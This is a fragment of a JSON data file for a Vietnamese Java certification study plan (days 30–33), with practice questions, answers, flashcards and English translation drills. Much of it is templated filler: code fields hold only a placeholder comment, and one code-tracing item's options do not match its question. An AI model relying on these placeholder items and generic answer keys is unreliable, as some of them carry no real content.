          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "// TestKing Code Tracing Practice",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Khai báo class và gói",
          "questions": [
            {
              "q": "Một file Java có thể không có khai báo package nào không? Khi đó nó thuộc package nào?",
              "ans": "Hoàn toàn được! Khi đó file thuộc về default package (unnamed package). Các class trong default package không thể được import bởi các class nằm trong package có tên."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Xung đột modifier",
          "questions": [
            {
              "q": "Tại sao không thể kết hợp `abstract` với `private` trong khai báo method?",
              "ans": "Vì `abstract` bắt buộc lớp con phải nhìn thấy để ghi đè (override), trong khi `private` cấm hoàn toàn lớp con nhìn thấy và kế thừa. Đây là mâu thuẫn trực tiếp về thiết kế."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace phạm vi truy cập thuộc tính kế thừa",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nclass Base { protected int val = 42; }\nclass Sub extends Base {\n    void printVal() { System.out.println(val); }\n}\npublic class Test {\n    public static void main(String[] args) {\n        new Sub().printVal();\n    }\n}\n```\nKết quả in ra là gì?",
              "ans": "In ra: 42. Biến `protected` được kế thừa trực tiếp vào class con `Sub`, nên phương thức `printVal()` truy cập trực tiếp `val` một cách hợp lệ."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy khởi tạo biến static final không hợp lệ",
          "questions": [
            {
              "q": "Có thể gán giá trị cho biến `static final int MAX;` bên trong một constructor không?",
              "ans": "KHÔNG! Biến `static final` thuộc về class, trong khi constructor chạy khi tạo từng đối tượng (instance). Biến `static final` chỉ có thể gán giá trị tại nơi khai báo hoặc trong khối Static Initialization Block."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Static method trong Interface từ Java 8",
          "questions": [
            {
              "q": "Cho interface `A { static void f() {} }` và `class B implements A {}`. Câu lệnh `B.f();` có hợp lệ không?",
              "ans": "Không hợp lệ! Phương thức `static` trong Interface KHÔNG được kế thừa sang class thực thi. Cú pháp duy nhất để gọi là thông qua tên Interface: `A.f();`."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_30_1",
          "q": "Về mặt kỹ thuật, khẳng định nào sau đây là CHÍNH XÁC NHẤT về chuyên đề Declarations, Access modifiers, Abstract classes, Interfaces?",
          "options": [
            "Đặc tả Java quy định cú pháp và cơ chế của Declarations, Access modifiers, Abstract classes, Interfaces phải được kiểm tra chặt chẽ tại compile-time hoặc runtime",
            "Chỉ hoạt động được trên hệ điều hành Windows",
            "Không bao giờ xảy ra ngoại lệ khi thực thi",
            "Bị cấm sử dụng trong các dự án thực tế"
          ],
          "correct": 0,
          "exp": "Khẳng định 1 tuân thủ đúng chuẩn kiến trúc và đặc tả ngôn ngữ Java cho phần Declarations, Access modifiers, Abstract classes, Interfaces."
        },
        {
          "id": "da_30_2",
          "q": "Khi thao tác với Declarations, Access modifiers, Abstract classes, Interfaces, lỗi nào phổ biến nhất?",
          "options": [
            "Lỗi cú pháp (Compile Error)",
            "NullPointerException",
            "ArrayIndexOutOfBoundsException",
            "StackOverflowError"
          ],
          "correct": 0,
          "exp": "Người học thường gặp lỗi biên dịch do không nắm chắc quy tắc định danh hoặc kiểu dữ liệu."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Một class có thể vừa kế thừa một Abstract Class vừa implement Interface được không?",
          "a": "ĐƯỢC. Cú pháp: `class Child extends ParentAbstract implements InterfaceA, InterfaceB`. Thứ tự bắt buộc từ khóa `extends` phải đứng trước từ khóa `implements`.",
          "trap": "Đảo ngược `implements A extends B` sẽ bị Compile Error ngay."
        }
      ],
      "dailyEnglish": [
        {
          "id": 9,
          "vi": "(Lấy tất cả dữ liệu về ngày nghỉ của các tháng và các năm trong database)",
          "en": "Get all days off of months and years from database"
        },
        {
          "id": 10,
          "vi": "Xóa tất cả ngày nghỉ của một tháng",
          "en": "Delete all days off of a month"
        },
        {
          "id": 11,
          "vi": "(Trả về true nếu thành công hoặc false nếu thất bại",
          "en": "Return \"true\" on success or \"false\" on failure"
        },
        {
          "id": 12,
          "vi": "(Đăng ký hoặc update ngày nghỉ của một tháng)",
          "en": "Register or update days off of a month"
        },
        {
          "id": 13,
          "vi": "(Lấy danh sách ngày nghỉ của một tháng)",
          "en": "Get list of days off of a month"
        }
      ]
    },
    "31": {
      "day": 31,
      "week": 5,
      "title": "Chuẩn hóa Java Error Notebook",
      "topics": [
        "Phân loại 8 mục: 1. Syntax trap, 2. Compile error, 3. Runtime exception, 4. OOP trap, 5. String trap, 6. Collection trap, 7. Thread trap, 8. Operator trap"
      ],
      "tasks": [
        "Tổng hợp và biên tập lại toàn bộ lỗi sai từ đầu tới giờ",
        "Làm 20 câu TestKing review"
      ],
      "englishDrill": [
        {
          "id": 12,
          "vi": "(Đăng ký hoặc update ngày nghỉ của một tháng)",
          "en": "Register or update days off of a month"
        },
        {
          "id": 13,
          "vi": "(Lấy danh sách ngày nghỉ của một tháng)",
          "en": "Get list of days off of a month"
        },
        {
          "id": 14,
          "vi": "(Duyệt qua các ngày của tháng)",
          "en": "Iterate days of the month"
        },
        {
          "id": 15,
          "vi": "(Kiểm tra nếu I bằng với  listDayOff.length - 1 thì không nối \",\", ngược lại thì nối \",\" )",
          "en": "Check if I is equal to listDayOff.length minus 1, do not append \",\" else append \",\""
        },
        {
          "id": 16,
          "vi": "(Nếu ngày của tháng có dữ liệu bằng \"*\" thì tăng biến countDayOff lên 1 đơn vị)",
          "en": "if day of month has data containing \"*\", increase countDayOff by 1"
        }
      ],
      "summary": "TestKing Marathon Đợt 3: Cày 40-50 câu/ngày, đọc code phát hiện bẫy cú pháp.",
      "coreTheory": "\n### Quy trình cày TestKing chuẩn phản xạ:\n1. Đọc kỹ câu hỏi, **tuyệt đối không xem đáp án trước**.\n2. Phân tích: Đoạn code này compile được không? Dòng nào có nguy cơ lỗi?\n3. Nếu compile được: Output là gì? Có ném exception lúc chạy không?\n4. Chọn đáp án -> Kiểm tra -> Nếu sai, ghi ngay vào **Error Notebook**.\n5. Tự viết 1 ví dụ code tương tự trên IDE để chứng minh tại sao đáp án đó đúng.\n",
      "codeSnippet": "// TestKing Code Tracing Practice",
      "traps": [
        "Học thuộc đáp án sẽ thất bại nếu đề thi thật chỉ cần đổi 1 dấu chấm phẩy hoặc toán tử ++."
      ],
      "quickQuiz": [
        {
          "q": "Biểu thức `boolean b = (false && (x++ > 0));` có làm tăng giá trị của `x` không? Tại sao?",
          "a": "Không tăng! Toán tử logic ngắn mạch `&&` (short-circuit) dừng ngay khi gặp vế trái là `false`, biểu thức vế phải không hề được đánh giá."
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐⭐",
      "priority": "🟠 HIGH (SQL & Web & TestKing)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: Phân loại 8 mục: 1. Syntax trap, 2. Compile error, 3. Runtime exception, 4. OOP trap, 5. String trap, 6. Collection trap, 7. Thread trap, 8. Operator trap.",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "\n### Quy trình cày TestKing chuẩn phản xạ:\n1. Đọc kỹ câu hỏi, **tuyệt đối không xem đáp án trước**.\n2. Phân tích: Đoạn code này compile được không? Dòng nào có nguy cơ lỗi?\n3. Nếu compile được: Output là gì? Có ném exception lúc chạy không?\n4. Chọn đáp án -> Kiểm tra -> Nếu sai, ghi ngay vào **Error Notebook**.\n5. Tự viết 1 ví dụ code tương tự trên IDE để chứng minh tại sao đáp án đó đúng.\n",
          "code": "// TestKing Code Tracing Practice"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_31_1",
          "level": "Easy",
          "question": "Hôm nay cần hoàn thành bao nhiêu câu TestKing?",
          "code": "// TestKing Code Tracing Practice",
          "options": [
            "Đúng theo dự đoán",
            "Compile Error",
            "Runtime Exception",
            "Khác"
          ],
          "correctIndex": 0,
          "explanation": "40 - 50 câu không nhìn đáp án."
        }
      ],
      "examTraps": [
        {
          "trap": "Cạm bẫy 1: Học thuộc đáp án sẽ thất bại nếu đề thi thật chỉ cần đổi 1 dấu chấm phẩy hoặc toán tử ++.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "// TestKing Code Tracing Practice",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Độ ưu tiên toán tử",
          "questions": [
            {
              "q": "Toán tử nào có độ ưu tiên cao nhất: nhân chia `* /`, gán `=`, hay toán tử hậu tố `expr++`?",
              "ans": "Toán tử hậu tố `expr++` có độ ưu tiên cao nhất, sau đó đến nhân chia `* /`, và thấp nhất là toán tử gán `=`."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Side effect trong toán tử logic ngắn mạch",
          "questions": [
            {
              "q": "Biểu thức `boolean res = (true || (++x > 0));` có làm biến `x` thay đổi không?",
              "ans": "Không làm thay đổi biến `x`! Vì toán tử `||` thấy vế trái là `true` nên dừng đánh giá ngay lập tức (ngắn mạch)."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace toán tử kết hợp tăng giảm và phép gán",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nint x = 5;\nx = x++;\nSystem.out.println(x);\n```\nKết quả in ra là gì? Tại sao?",
              "ans": "In ra: 5 (không phải 6!). Giải thích: Biểu thức `x++` lấy giá trị cũ (5) nạp vào stack, sau đó `x` tăng lên 6 trong bộ nhớ. Tiếp theo phép gán `=` gán giá trị trên stack (5) đè lại vào `x`, khiến `x` quay trở lại 5."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy nối chuỗi với phép cộng",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nSystem.out.println(1 + 2 + \"3\" + 4 + 5);\n```\nKết quả in ra màn hình là gì?",
              "ans": "In ra: `\"3345\"`. Đánh giá từ trái sang phải: `1 + 2 = 3` (số), sau đó `3 + \"3\" = \"33\"` (chuỗi), tiếp tục `\"33\" + 4 = \"334\"`, `\"334\" + 5 = \"3345\"`."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Toán tử ba ngôi trả về kiểu khác nhau",
          "questions": [
            {
              "q": "Biểu thức `Object obj = true ? new Integer(1) : new Double(2.0); System.out.println(obj);` in ra gì?",
              "ans": "In ra: `1.0`! Do toán tử ba ngôi yêu cầu một kiểu dữ liệu chung tương thích giữa 2 nhánh, `Integer` sẽ được nâng kiểu (numeric promotion) thành `Double`, khiến giá trị 1 bị ép thành 1.0."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_31_1",
          "q": "Về mặt kỹ thuật, khẳng định nào sau đây là CHÍNH XÁC NHẤT về chuyên đề Phân loại 8 mục: 1. Syntax trap, 2. Compile error, 3. Runtime exception, 4. OOP trap, 5. String trap, 6. Collection trap, 7. Thread trap, 8. Operator trap?",
          "options": [
            "Đặc tả Java quy định cú pháp và cơ chế của Phân loại 8 mục: 1. Syntax trap, 2. Compile error, 3. Runtime exception, 4. OOP trap, 5. String trap, 6. Collection trap, 7. Thread trap, 8. Operator trap phải được kiểm tra chặt chẽ tại compile-time hoặc runtime",
            "Chỉ hoạt động được trên hệ điều hành Windows",
            "Không bao giờ xảy ra ngoại lệ khi thực thi",
            "Bị cấm sử dụng trong các dự án thực tế"
          ],
          "correct": 0,
          "exp": "Khẳng định 1 tuân thủ đúng chuẩn kiến trúc và đặc tả ngôn ngữ Java cho phần Phân loại 8 mục: 1. Syntax trap, 2. Compile error, 3. Runtime exception, 4. OOP trap, 5. String trap, 6. Collection trap, 7. Thread trap, 8. Operator trap."
        },
        {
          "id": "da_31_2",
          "q": "Khi thao tác với Phân loại 8 mục: 1. Syntax trap, 2. Compile error, 3. Runtime exception, 4. OOP trap, 5. String trap, 6. Collection trap, 7. Thread trap, 8. Operator trap, lỗi nào phổ biến nhất?",
          "options": [
            "Lỗi cú pháp (Compile Error)",
            "NullPointerException",
            "ArrayIndexOutOfBoundsException",
            "StackOverflowError"
          ],
          "correct": 0,
          "exp": "Người học thường gặp lỗi biên dịch do không nắm chắc quy tắc định danh hoặc kiểu dữ liệu."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Tám nhóm lỗi kinh điển cần phân loại trong Sổ tay lỗi Java (Error Notebook)?",
          "a": "1. Syntax trap (dấu chấm phẩy, octal)\n2. Compile error (casting, uninitialized variable)\n3. Runtime exception (NPE, ClassCast, IndexOutOfBounds)\n4. OOP trap (overriding rules, hiding)\n5. String pool trap (== vs equals)\n6. Collection trap (equals/hashCode, Comparator)\n7. Thread concurrency (deadlock, wait/notify)\n8. Arithmetic/Promotion trap (overflow, byte math).",
          "trap": "Khi làm sai, ghi lại chính xác dòng code và bản chất cơ chế máy ảo JVM."
        }
      ],
      "dailyEnglish": [
        {
          "id": 12,
          "vi": "(Đăng ký hoặc update ngày nghỉ của một tháng)",
          "en": "Register or update days off of a month"
        },
        {
          "id": 13,
          "vi": "(Lấy danh sách ngày nghỉ của một tháng)",
          "en": "Get list of days off of a month"
        },
        {
          "id": 14,
          "vi": "(Duyệt qua các ngày của tháng)",
          "en": "Iterate days of the month"
        },
        {
          "id": 15,
          "vi": "(Kiểm tra nếu I bằng với  listDayOff.length - 1 thì không nối \",\", ngược lại thì nối \",\" )",
          "en": "Check if I is equal to listDayOff.length minus 1, do not append \",\" else append \",\""
        },
        {
          "id": 16,
          "vi": "(Nếu ngày của tháng có dữ liệu bằng \"*\" thì tăng biến countDayOff lên 1 đơn vị)",
          "en": "if day of month has data containing \"*\", increase countDayOff by 1"
        }
      ]
    },
    "32": {
      "day": 32,
      "week": 5,
      "title": "TestKing Marathon Part 3 (Câu 81 - 130)",
      "topics": [
        "Flow control, Loops, Exceptions try-catch-finally"
      ],
      "tasks": [
        "Hoàn thành 50 câu TestKing",
        "Luyện tập code tracing các bài loop phức tạp"
      ],
      "englishDrill": [
        {
          "id": 15,
          "vi": "(Kiểm tra nếu I bằng với  listDayOff.length - 1 thì không nối \",\", ngược lại thì nối \",\" )",
          "en": "Check if I is equal to listDayOff.length minus 1, do not append \",\" else append \",\""
        },
        {
          "id": 16,
          "vi": "(Nếu ngày của tháng có dữ liệu bằng \"*\" thì tăng biến countDayOff lên 1 đơn vị)",
          "en": "if day of month has data containing \"*\", increase countDayOff by 1"
        },
        {
          "id": 17,
          "vi": "(Export tất cả các tháng của năm hiện tại trên màn hình)",
          "en": "Export data of all months of current year on screen"
        },
        {
          "id": 18,
          "vi": "(Export tất cả dữ liệu về ngày nghỉ trong database)",
          "en": "Export all data of days off in database"
        },
        {
          "id": 19,
          "vi": "(Khai báo biến flag để lưu chỉ số của vị trí mà xảy ra sự thay đổi của \"year\" )",
          "en": "Declare \"FLAG\" variables to save the index of location which occurs the change of year"
        }
      ],
      "summary": "TestKing Marathon Đợt 4: Cày 40-50 câu/ngày, đọc code phát hiện bẫy cú pháp.",
      "coreTheory": "\n### Quy trình cày TestKing chuẩn phản xạ:\n1. Đọc kỹ câu hỏi, **tuyệt đối không xem đáp án trước**.\n2. Phân tích: Đoạn code này compile được không? Dòng nào có nguy cơ lỗi?\n3. Nếu compile được: Output là gì? Có ném exception lúc chạy không?\n4. Chọn đáp án -> Kiểm tra -> Nếu sai, ghi ngay vào **Error Notebook**.\n5. Tự viết 1 ví dụ code tương tự trên IDE để chứng minh tại sao đáp án đó đúng.\n",
      "codeSnippet": "// TestKing Code Tracing Practice",
      "traps": [
        "Học thuộc đáp án sẽ thất bại nếu đề thi thật chỉ cần đổi 1 dấu chấm phẩy hoặc toán tử ++."
      ],
      "quickQuiz": [
        {
          "q": "Nếu khối `catch(Exception e)` đặt trước khối `catch(IOException e)` thì trình biên dịch Java sẽ báo gì?",
          "a": "Compile Error: `unreachable catch block for IOException. It is already handled by the catch block for Exception` (Luật: Exception con phải bắt trước Exception cha)."
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐⭐",
      "priority": "🟠 HIGH (SQL & Web & TestKing)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: Flow control, Loops, Exceptions try-catch-finally.",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "\n### Quy trình cày TestKing chuẩn phản xạ:\n1. Đọc kỹ câu hỏi, **tuyệt đối không xem đáp án trước**.\n2. Phân tích: Đoạn code này compile được không? Dòng nào có nguy cơ lỗi?\n3. Nếu compile được: Output là gì? Có ném exception lúc chạy không?\n4. Chọn đáp án -> Kiểm tra -> Nếu sai, ghi ngay vào **Error Notebook**.\n5. Tự viết 1 ví dụ code tương tự trên IDE để chứng minh tại sao đáp án đó đúng.\n",
          "code": "// TestKing Code Tracing Practice"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_32_1",
          "level": "Easy",
          "question": "Hôm nay cần hoàn thành bao nhiêu câu TestKing?",
          "code": "// TestKing Code Tracing Practice",
          "options": [
            "Đúng theo dự đoán",
            "Compile Error",
            "Runtime Exception",
            "Khác"
          ],
          "correctIndex": 0,
          "explanation": "40 - 50 câu không nhìn đáp án."
        }
      ],
      "examTraps": [
        {
          "trap": "Cạm bẫy 1: Học thuộc đáp án sẽ thất bại nếu đề thi thật chỉ cần đổi 1 dấu chấm phẩy hoặc toán tử ++.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "// TestKing Code Tracing Practice",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Cấu trúc điều khiển và Exception",
          "questions": [
            {
              "q": "Vòng lặp `do-while` có đặc điểm gì khác biệt so với vòng lặp `while`?",
              "ans": "Vòng lặp `do-while` luôn thực thi khối lệnh ít nhất MỘT LẦN trước khi kiểm tra điều kiện lặp."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Rethrow Exception và chữ ký phương thức",
          "questions": [
            {
              "q": "Nếu một phương thức bắt một Checked Exception rồi ném lại nó bằng `throw e;`, phương thức đó phải làm gì ở phần khai báo?",
              "ans": "Bắt buộc phải khai báo `throws` loại Exception đó ở chữ ký của phương thức (signature)."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace switch case có câu lệnh return",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\npublic static int calc(int n) {\n    switch(n) {\n        case 1: return 10;\n        case 2: n += 5;\n        case 3: return n * 2;\n        default: return 0;\n    }\n}\n```\nKhi gọi `calc(2)`, giá trị trả về là bao nhiêu?",
              "ans": "Trả về: 14! Khớp `case 2`, `n` tăng thành `2 + 5 = 7`. Do không có `break` hay `return` ở case 2, nó fall-through xuống `case 3` và thực thi `return n * 2`, tức `7 * 2 = 14`."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy ném ngoại lệ trong khối catch",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\ntry {\n    throw new RuntimeException(\"A\");\n} catch (Exception e) {\n    throw new RuntimeException(\"B\");\n} finally {\n    System.out.print(\"F \");\n}\n```\nChương trình in ra gì trước khi ném ngoại lệ?",
              "ans": "In ra `F ` trước khi ngoại lệ \"B\" làm dừng chương trình! Khối `finally` luôn luôn được chạy trước khi ngoại lệ từ khối `catch` được truyền tiếp lên tầng trên."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Unchecked Exception trong chữ ký interface",
          "questions": [
            {
              "q": "Nếu interface khai báo `void m();` không có throws, lớp con implements có được phép ném `ArithmeticException` không?",
              "ans": "Hoàn toàn được phép! `ArithmeticException` là một `RuntimeException` (Unchecked Exception), có thể được ném ra ở bất kỳ phương thức nào mà không cần khai báo throws trong interface."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_32_1",
          "q": "Về mặt kỹ thuật, khẳng định nào sau đây là CHÍNH XÁC NHẤT về chuyên đề Flow control, Loops, Exceptions try-catch-finally?",
          "options": [
            "Đặc tả Java quy định cú pháp và cơ chế của Flow control, Loops, Exceptions try-catch-finally phải được kiểm tra chặt chẽ tại compile-time hoặc runtime",
            "Chỉ hoạt động được trên hệ điều hành Windows",
            "Không bao giờ xảy ra ngoại lệ khi thực thi",
            "Bị cấm sử dụng trong các dự án thực tế"
          ],
          "correct": 0,
          "exp": "Khẳng định 1 tuân thủ đúng chuẩn kiến trúc và đặc tả ngôn ngữ Java cho phần Flow control, Loops, Exceptions try-catch-finally."
        },
        {
          "id": "da_32_2",
          "q": "Khi thao tác với Flow control, Loops, Exceptions try-catch-finally, lỗi nào phổ biến nhất?",
          "options": [
            "Lỗi cú pháp (Compile Error)",
            "NullPointerException",
            "ArrayIndexOutOfBoundsException",
            "StackOverflowError"
          ],
          "correct": 0,
          "exp": "Người học thường gặp lỗi biên dịch do không nắm chắc quy tắc định danh hoặc kiểu dữ liệu."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Vòng lặp `do-while` có điểm gì đặc biệt so với `while` và `for`?",
          "a": "Vòng lặp `do-while` luôn luôn thực thi khối lệnh bên trong ít nhất 1 lần trước khi kiểm tra điều kiện lặp ở cuối. Cú pháp bắt buộc phải có dấu chấm phẩy sau điều kiện: `do { ... } while (condition);`.",
          "trap": "Quên dấu chấm phẩy `;` sau `while(...)` trong vòng lặp do-while sẽ bị Compile Error!"
        }
      ],
      "dailyEnglish": [
        {
          "id": 15,
          "vi": "(Kiểm tra nếu I bằng với  listDayOff.length - 1 thì không nối \",\", ngược lại thì nối \",\" )",
          "en": "Check if I is equal to listDayOff.length minus 1, do not append \",\" else append \",\""
        },
        {
          "id": 16,
          "vi": "(Nếu ngày của tháng có dữ liệu bằng \"*\" thì tăng biến countDayOff lên 1 đơn vị)",
          "en": "if day of month has data containing \"*\", increase countDayOff by 1"
        },
        {
          "id": 17,
          "vi": "(Export tất cả các tháng của năm hiện tại trên màn hình)",
          "en": "Export data of all months of current year on screen"
        },
        {
          "id": 18,
          "vi": "(Export tất cả dữ liệu về ngày nghỉ trong database)",
          "en": "Export all data of days off in database"
        },
        {
          "id": 19,
          "vi": "(Khai báo biến flag để lưu chỉ số của vị trí mà xảy ra sự thay đổi của \"year\" )",
          "en": "Declare \"FLAG\" variables to save the index of location which occurs the change of year"
        }
      ]
    },
    "33": {
      "day": 33,
      "week": 5,
      "title": "TestKing Marathon Part 4 (Câu 131 - 180)",
      "topics": [
        "OOP, Inheritance, Polymorphism, Overriding"
      ],
      "tasks": [
        "Hoàn thành 50 câu TestKing",
        "Chú ý bẫy covariant return types và static method hiding"
      ],
      "englishDrill": [
        {
          "id": 18,
          "vi": "(Export tất cả dữ liệu về ngày nghỉ trong database)",
          "en": "Export all data of days off in database"
        },
        {
          "id": 19,
          "vi": "(Khai báo biến flag để lưu chỉ số của vị trí mà xảy ra sự thay đổi của \"year\" )",
          "en": "Declare \"FLAG\" variables to save the index of location which occurs the change of year"
        },
        {
          "id": 20,
          "vi": "(Check nếu các object có cùng năm thì export ra cùng 1 sheet, ngược lại nếu khác năm thì export ra các sheet các nhau)",
          "en": "Check if objects have same year, then export into the same sheet, else, export into different sheet"
        },
        {
          "id": 21,
          "vi": "Ham kiem tra du lieu co ton tai trong database hay khong",
          "en": "check existion of data from database"
        },
        {
          "id": 22,
          "vi": "Kiem tra yeu cau update va delete tu client, neu co loi thi khong thuc hien",
          "en": "Check requirements of updating and deleting from client, if errors appear, do not execute"
        }
      ],
      "summary": "TestKing Marathon Đợt 5: Cày 40-50 câu/ngày, đọc code phát hiện bẫy cú pháp.",
      "coreTheory": "\n### Quy trình cày TestKing chuẩn phản xạ:\n1. Đọc kỹ câu hỏi, **tuyệt đối không xem đáp án trước**.\n2. Phân tích: Đoạn code này compile được không? Dòng nào có nguy cơ lỗi?\n3. Nếu compile được: Output là gì? Có ném exception lúc chạy không?\n4. Chọn đáp án -> Kiểm tra -> Nếu sai, ghi ngay vào **Error Notebook**.\n5. Tự viết 1 ví dụ code tương tự trên IDE để chứng minh tại sao đáp án đó đúng.\n",
      "codeSnippet": "// TestKing Code Tracing Practice",
      "traps": [
        "Học thuộc đáp án sẽ thất bại nếu đề thi thật chỉ cần đổi 1 dấu chấm phẩy hoặc toán tử ++."
      ],
      "quickQuiz": [
        {
          "q": "Phương thức private của class cha có thể bị override bởi class con không?",
          "a": "Không! Phương thức `private` không được kế thừa. Phương thức trùng tên ở class con chỉ là một phương thức mới hoàn toàn (không có quan hệ polymorphism/override)."
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐⭐",
      "priority": "🟠 HIGH (SQL & Web & TestKing)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: OOP, Inheritance, Polymorphism, Overriding.",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "\n### Quy trình cày TestKing chuẩn phản xạ:\n1. Đọc kỹ câu hỏi, **tuyệt đối không xem đáp án trước**.\n2. Phân tích: Đoạn code này compile được không? Dòng nào có nguy cơ lỗi?\n3. Nếu compile được: Output là gì? Có ném exception lúc chạy không?\n4. Chọn đáp án -> Kiểm tra -> Nếu sai, ghi ngay vào **Error Notebook**.\n5. Tự viết 1 ví dụ code tương tự trên IDE để chứng minh tại sao đáp án đó đúng.\n",
          "code": "// TestKing Code Tracing Practice"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_33_1",
          "level": "Easy",
          "question": "Hôm nay cần hoàn thành bao nhiêu câu TestKing?",
          "code": "// TestKing Code Tracing Practice",
          "options": [
            "Đúng theo dự đoán",
            "Compile Error",
            "Runtime Exception",
            "Khác"
          ],
          "correctIndex": 0,
          "explanation": "40 - 50 câu không nhìn đáp án."
        }
      ],
      "examTraps": [
        {
          "trap": "Cạm bẫy 1: Học thuộc đáp án sẽ thất bại nếu đề thi thật chỉ cần đổi 1 dấu chấm phẩy hoặc toán tử ++.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "// TestKing Code Tracing Practice",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Quy tắc đa hình trong TestKing Ch5",
          "questions": [
            {
              "q": "Một interface có thể kế thừa (extends) nhiều interface khác cùng lúc được không?",
              "ans": "Được phép! Java hỗ trợ đa kế thừa giữa các Interface (`interface C extends A, B`)."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Tính đóng gói và JavaBeans standard",
          "questions": [
            {
              "q": "Tiêu chuẩn đặt tên getter cho thuộc tính kiểu `boolean` là gì?",
              "ans": "Bắt đầu bằng tiền tố `is` (ví dụ `isActive()`, `isEnabled()`), thay vì dùng `get`."
            }
          ]
        },
